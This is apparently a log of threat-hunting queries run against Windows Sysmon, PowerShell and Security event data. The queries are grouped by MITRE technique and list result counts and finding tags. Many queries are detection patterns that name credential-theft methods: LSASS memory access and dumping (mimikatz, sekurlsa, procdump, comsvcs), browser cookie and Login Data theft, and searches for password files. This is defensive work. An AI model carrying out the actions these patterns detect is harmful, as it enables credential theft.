| q-084cebc986 | triage T1187 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpESdr2"} | None | F21 |
| q-5bbdc25834 | triage T1187 step 2 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*hostui* OR win.ScriptBlockText:*StartUp* OR win.ScriptBlockText:*lnk* OR win.ScriptBlockText:*WScript.Shell* OR win.ScriptBlockText:*CreateShortcut*)", "time_from": null, "ti… | 3 |  |
| q-07e94327a9 | triage T1187 step 3 | search | {"dataset": "windows.sysmon", "query": "process.command_line:*hostui* OR win.TargetFilename:*hostui* OR win.Image:*hostui* OR process.executable:*hostui*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "pr… | 26 | F22 |
| q-feaae43faa | triage T1187 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:139 OR destination.port:445)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "process.executable", "process.command_line", "destin… | 66 | F21 |
| q-a189a9c14f | triage T1187 step 4 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND (@timestamp:[2020-05-02T03:21:00.000Z TO 2020-05-02T03:28:30.000Z]) AND (event.code:1 OR event.code:3 OR event.code:11 OR event.code:22 OR event.code:13 OR event.code:12)", "time_from… | 4879 |  |
| q-aaa8d9c13e | triage T1187 step 4 | search | {"dataset": "windows.sysmon", "query": "win.TargetFilename:*hostui.bat OR process.command_line:*hostui.bat", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "process.executable", "process.command_line", "win… | 0 |  |
| q-6a585b042b | triage T1187 step 5 | search | {"dataset": "windows.sysmon", "query": "(win.Image:*hostui* OR process.parent.executable:*hostui* OR win.TargetFilename:*hostui*) AND (event.code:3 OR event.code:22 OR event.code:11 OR event.code:1)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 6 | F22 |
| q-7becaba412 | triage T1187 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*System32* AND (win.TargetFilename:*.bat OR win.TargetFilename:*.exe OR win.TargetFilename:*.dll)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.nam… | 0 |  |
| q-ecd6ad300b | triage T1187 step 6 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND (win.TargetObject:*Javasoft* OR win.TargetObject:*Supplement* OR process.command_line:*Javasoft*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.nam… | 3 | F22 |
| q-2c40ab97b1 | triage T1187 step 6 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND event.code:3 AND @timestamp:[2020-05-02T03:21:00.000Z TO 2020-05-02T03:28:30.000Z]", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code… | 12 | F22 |
| q-4a1123da1f | triage T1187 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None | F22 |
| q-d60896c500 | triage T1187 step 8 | search | {"dataset": "windows.sysmon", "query": "(win.TargetFilename:*\\\\\\\\* OR process.command_line:*\\\\\\\\* OR win.TargetFilename:*@SSL* OR win.TargetFilename:*DavWWWRoot* OR process.command_line:*DavWWWRoot* OR process.command_line:*@SSL*) AND NOT win.TargetFil… | ERROR |  |
| q-2bbf77e411 | triage T1187 step 8 | count | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:139 OR destination.port:445) AND NOT (destination.ip:10.0.0.4 OR destination.ip:10.0.1.6 OR destination.ip:fe80*)", "time_from": null, "time_to": null} | 24 |  |
| q-5a181907e9 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-5bd23ab62a | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-96a4b6c22c | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpizV0l"} | None |  |
| q-a9526cc67a | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpESdr2"} | None |  |
| q-1a37f67d76 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWW2"} | None |  |
| q-7f4b956e00 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-bf89afd996 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-58b197aa8f | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-BEDj"} | None |  |
| q-3f6b4ace44 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cFt"} | None |  |
| q-e2d1804dae | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkILJ_D"} | None |  |
| q-6204234fe7 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8X3"} | None |  |
| q-f657dbc206 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cEe"} | None |  |
| q-04eab78af7 | triage T1212 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)", "time_from": null, "time… | 9 | F23 |
| q-0f722859e3 | triage T1212 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (process.executable:*PowerShell* OR process.executable:*wsmprovhost* OR process.executable:*wininit* OR process.executable:*csrss* OR process.executable:*services.exe)", "tim… | 9 |  |
| q-2225e4eea8 | triage T1212 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None | F23 |
| q-7c72e70a75 | triage T1212 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None | F23 |
| q-47e05740ba | triage T1212 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:12:00.000Z\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockId, win.… | 40 |  |
| q-b9861b0fe0 | triage T1212 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*credential*\"… | 11 |  |
| q-c68e147d23 | triage T1212 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:12:00.000Z\" \| KEEP @timestamp, host.nam… | 47 | F23 |
| q-a598635b87 | triage T1212 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None | F23 |
| q-0d57bcecde | triage T1212 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:20:00.000Z\" \| STATS c = COUNT(*) BY host.name, win.LogonType, win.TargetUserNa… | 25 |  |
| q-4608d3401b | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-aedaead10c | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-34cc115cde | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-2955e19e25 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-56e819305e | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItwAjopf"} | ERROR |  |
| q-8014bc8f63 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-2086d9d370 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-1d1d9fbeab | triage T1212 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None | F23 |
| q-67dde4eef2 | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-ca601bd5a4 | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrx"} | None |  |
| q-efd3299666 | triage T1539 step 1 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Cookies* OR process.command_line:*Login Data* OR process.command_line:*chrome* OR process.command_line:*firefox*)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 4 | F24 |
| q-fc3ba7a6fc | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*web data*\" OR TO_… | ERROR |  |
| q-2b0a4e2d0a | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*cookie*\" OR TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*chrome*\" OR T… | 8 | F24 |
| q-b91e9838de | triage T1539 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*web data*\" OR TO_… | 5 | F24 |
| q-6cc8b873db | triage T1539 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*chrome*\" OR TO_LOWER(win.TargetImage) LIKE \"*firefox*\" OR TO_LOWER(win.TargetImage) LIKE \"*iexplore*\" OR TO_LOWER(win.Tar… | 374 |  |
| q-4559af00af | triage T1539 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*edge*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*cookie*\" OR TO_LOWER(w… | 15 |  |
| q-508beb460d | triage T1539 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND (TO_LOWER(process.command_line) LIKE \"*invoke*\" OR TO_LOWER(process.command_line) LIKE \"*psversion*\" OR TO_LOWER(p… | 9 |  |
| q-a4c200b810 | triage T1539 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None | F24 |
| q-c10fa42949 | triage T1539 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND (TO_LOWER(win.ObjectName) LIKE \"*cookies*\" OR TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*web data*\" OR TO_LOWER(wi… | 0 |  |
| q-7128112695 | triage T1539 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*cookies*\" OR TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*web data*\" O… | 0 |  |
| q-46aba1813c | triage T1539 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND process.executable LIKE \"*PowerShell.exe\" AND win.TargetImage LIKE \"*MicrosoftEdge*\" \| KEEP @timestamp, host.name, user.name, process.executable, win.Target… | 3 | F24 |
| q-40a2f8e6e9 | triage T1539 step 7 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND win.TargetFilename LIKE \"*INetCookies*\" \| KEEP @timestamp, host.name, process.executable, win.TargetFilename, _id, _index"} | 1 | F24 |
| q-1419ea7975 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNZkz"} | None |  |
| q-9adf42c8f8 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNpkH"} | None |  |
| q-6744e1fc9d | triage T1539 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXBOw"} | None |  |
| q-2396b0e277 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y1-"} | None |  |
| q-c6dd54cf08 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr1M"} | None |  |
| q-e74ea9941e | triage T1539 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-3d84a35ce3 | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None | F25 |
| q-7e883c115b | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSwG"} | None | F30 |
| q-34d0a74633 | triage T1552 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*pfx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_l… | 1 | F25, F27, F29 |
| q-cd36079b25 | triage T1552 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*passwordsDB*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 1 | F26 |
| q-94eda68344 | triage T1552 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 AND user.name == \"pbeesly\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlockId, _id, _index \| SORT @timestamp"} | ERROR |  |
| q-763e7811ab | triage T1552 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND (TO_LOWER(process.command_line) LIKE \"*readme.ps1*\" OR TO_LOWER(process.command_line) LIKE \"*passwordsdb*\" OR TO_LOWER(process.command_line) LIKE \"*accesschk*\" … | ERROR |  |
| q-8e0f79015d | triage T1552 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND user.name == \"pbeesly\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlockId, _id, _index \| SORT @timestamp"} | 157 |  |
| q-fc079ebe18 | triage T1552 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*readme.ps1*\" OR TO_LOWER(process.command_line) LIKE \"*passwordsdb*\" OR TO_LOWER(process.command_line) LIKE \"*accesschk… | 11 | F26, F30 |
| q-5ab572562b | triage T1552 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*password*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*credential*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*privatek… | 7 |  |
| q-bed96ec3db | triage T1552 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*working.zip*\" OR TO_LOWER(win.TargetFilename) LIKE \"*draft.zip*\" OR TO_LOWER(win.TargetFilename) LIKE \"*.zip\" OR TO_LO… | 7 | F26 |
| q-1ca73ad904 | triage T1552 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None | F25 |
| q-a5cf1a36c0 | triage T1552 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*unattend*\" OR TO_LOWER(process.command_line) LIKE \"*sysvol*\" OR TO_LOWER(process.command_line) LIKE \"*groups.xml*\" OR… | 1 | F30 |
| q-380640c8a3 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-60f7acf92d | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-2702c038c6 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-d5ed61a839 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-2281812dd9 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-4f4828c0e5 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-aced257bd3 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-fb3fea2928 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y3M"} | None |  |
| q-d1b6e8ab81 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdLv"} | None |  |
| q-aeae747eda | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-dad87a982c | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-cda0a588e2 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYmUF"} | None |  |
| q-f1ceb6d192 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-1d7867e4cc | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-a26fa4de29 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-a83532605a | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSwG"} | None |  |
| q-31557cb27d | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8V2"} | None |  |
| q-fbf54bd0c0 | triage T1555 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 | F31, F34 |
| q-f956224cc7 | triage T1555 step 1 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*Credential*)", "time_from": null, "time_t… | 3 | F31 |
| q-92b66a3957 | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-383c8f3a4b | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-34fe4fc4ac | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-027384602c | triage T1555 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*MiniDump* OR process.command_line:*procdump* OR process.command_line:*comsvcs* OR process.command_line:*sekurlsa* OR process.command_line:*mimikatz*… | 1 |  |
| q-ecf8c7eaf1 | triage T1555 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-e021348f8d | triage T1555 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-process*\" OR… | ERROR |  |
| q-006eb78e60 | triage T1555 step 4 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ObjectName", "win.ProcessName", "win.SubjectUserName", "win.AccessMask", "win.AccessList", "wi… | 6 | F31 |
| q-c55e5a15e3 | triage T1555 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-exfil*… | 11 | F31 |
| q-934e518e16 | triage T1555 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:nashua.dmevals.local AND (process.executable:*wsmprovhost* OR process.parent.executable:*wsmprovhost* OR process.executable:*powershell* OR process.executable:*pwsh*)", "time_from": null, "time… | 2 |  |
| q-81828c255d | triage T1555 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz-ho2U"} | None |  |
| q-bdf65a4b73 | triage T1555 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwEmW7D"} | None |  |
| q-f5993525f1 | triage T1555 step 7 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-1b62559ea6 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-3be2206a76 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-05bd0835a3 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-9ca13c54a1 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-b426381f10 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-d3c7feccac | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-85626b177e | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-33f0cbb6e2 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz-ho2U"} | None |  |
| q-0e67abb26d | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-8d6136feec | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-165bd54af1 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItpZYmUF"} | ERROR |  |
| q-7b4eb9fb40 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItpZYmUE"} | ERROR |  |
| q-2fe400aa1c | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-00a02f92e8 | triage T1555 step 9 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItpZYmUF"} | ERROR |  |
| q-ea45689ce0 | triage T1555 step 9 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItpZYmUE"} | ERROR |  |
| q-5758884f2e | triage T1555 step 10 | search | {"dataset": "windows.other", "query": "*vault* OR *credential* OR *cmdkey*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "message"], "size": 5, "sort": "asc"} | 2 | F33 |
| q-3c42249f5f | triage T1555 step 10 | search | {"dataset": "windows.other", "query": "event.code:11 OR event.code:1", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "message"], "size": 10, "sort": "asc"} | 7 | F32 |
| q-8b91cefdcc | triage T1556 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": "win.GrantedAccess"} | 326 |  |
| q-8b6e2f1dc0 | triage T1556 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDl0_c"} | None | F38 |
| q-5f4f798dce | triage T1556 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x3000)", "time_from": null, "time_to": null, "fields": ["@timest… | 8 | F35, F36 |
| q-2a95474afa | triage T1556 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*procdump* OR process.command_line:*comsvcs* OR process.command_line:*MiniDump* OR process.command_line:*sekurlsa* OR process.command_line:*ntds*)", … | 1 | F41 |
| q-e80ed7909c | triage T1556 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-65d9541a13 | triage T1556 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-71de7c4b48 | triage T1556 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:15:00.000Z\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlockId… | ERROR |  |
